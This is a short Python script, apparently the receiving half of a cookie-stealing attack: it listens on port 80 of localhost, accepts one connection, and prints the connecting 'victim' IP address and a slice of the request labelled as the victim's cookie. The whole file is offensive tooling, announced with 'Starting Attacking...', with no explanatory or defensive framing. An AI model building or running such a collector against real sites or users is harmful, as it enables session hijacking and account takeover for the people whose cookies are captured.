import socket
from time import sleep
print("[*] Starting Attacking...")
s = socket.socket()
s.bind(('127.0.0.1', 80))
sleep(1)
s.listen(1)
con, addr = s.accept()
data = con.recv(1024)
print("[+] Victim IP: {}".format(addr[0]))
print("[+] Victim's cookie: {}".format(data[8:147]))
s.close()
